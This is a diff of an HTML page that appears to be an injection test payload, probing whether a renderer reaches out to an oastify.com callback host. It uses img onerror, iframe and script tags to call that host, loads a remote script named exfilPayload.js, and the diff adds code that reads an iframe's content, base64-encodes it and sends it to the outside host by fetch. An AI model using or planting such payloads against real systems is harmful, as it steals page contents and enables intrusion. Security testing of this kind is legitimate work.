@@ -8,9 +8,18 @@
     <img src='http://gofodole.com' onerror="fetch('https://0yzqrzhdejb795s0xojbkmh6ixooco0d.oastify.com/jsimg, {'mode':'no-cors'})">
     <iframe src="https://0yzqrzhdejb795s0xojbkmh6ixooco0d.oastify.com/iframe"></iframe>
       <script src=https://0yzqrzhdejb795s0xojbkmh6ixooco0d.oastify.com/exfilPayload.js></script>
-    <script>
+    <script defer>
+      // Find the first iframe on the page
+const iframe = document.querySelector("iframe");
+
+// Get the content of the iframe as a string
+const content = iframe.contentDocument.documentElement.outerHTML;
+
+// Convert the content to base64
+const base64Content = btoa(content);
+
       const fetchUrl = 'https://0yzqrzhdejb795s0xojbkmh6ixooco0d.oastify.com/jsfetch'
-      fetch(fetchUrl, {"mode":"no-cors"})
+      fetch(fetchUrl+"/"+base64Content, {"mode":"no-cors"})
       document.body.appendChild(document.createElement("img")).src = 'https://0yzqrzhdejb795s0xojbkmh6ixooco0d.oastify.com/newimage'
     </script>
   </body>
